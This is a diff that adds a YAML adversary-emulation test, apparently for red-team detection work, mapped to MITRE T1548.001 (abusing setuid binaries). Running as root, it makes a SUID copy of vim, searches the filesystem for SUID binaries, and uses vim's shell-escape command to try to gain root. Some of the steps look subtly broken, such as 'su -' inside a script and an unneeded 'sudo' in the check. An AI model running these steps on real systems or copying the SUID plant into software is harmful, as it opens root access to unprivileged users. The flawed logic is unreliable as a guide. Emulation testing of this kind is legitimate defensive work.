@@ -1,0 +1,44 @@
+---
+name: suid-binary-escalation
+description: Use a SUID binary to escalate privileges.
+requirements:
+  platforms:
+    - os: linux
+  superuser: true
+args:
+  - name: unprivduser
+mitre:
+  tactics:
+    - TA0004 Privilege Escalation
+  techniques:
+    - T1548 Abuse Elevation Control Mechanism
+  subtechniques:
+    - T1548.001 Abuse Elevation Control Mechanism Setuid and Setgid
+steps:
+  - name: setup-privileges
+    inline: |
+      cp /usr/bin/vim /usr/bin/vim.old && \
+      chmod u+s /usr/bin/vim.old
+    cleanup:
+      inline: |
+        echo "Removing copy of target binary"
+        rm -rf /usr/bin/vim.old
+  - name: hunt-for-suid-bins
+    inline: |
+      su - {{ .Args.unprivduser }}
+      find / -perm -4000
+      exit 0
+  - name: escalate-privilege
+    inline: |
+      echo "Switching to unprivd user"
+      su - {{ .Args.unprivduser }}
+      echo "Using SUID binary to escalate privs"
+      output="$(/usr/bin/vim.old -c ':silent !sudo whoami' -c 'qa' 2> /dev/null)"
+      echo "Checking results"
+      if [ "$output" == "root" ]; then
+        echo "TTP Ran Successfully"
+        exit 0
+      else
+      echo "TTP failed"
+        exit 1
+      fi
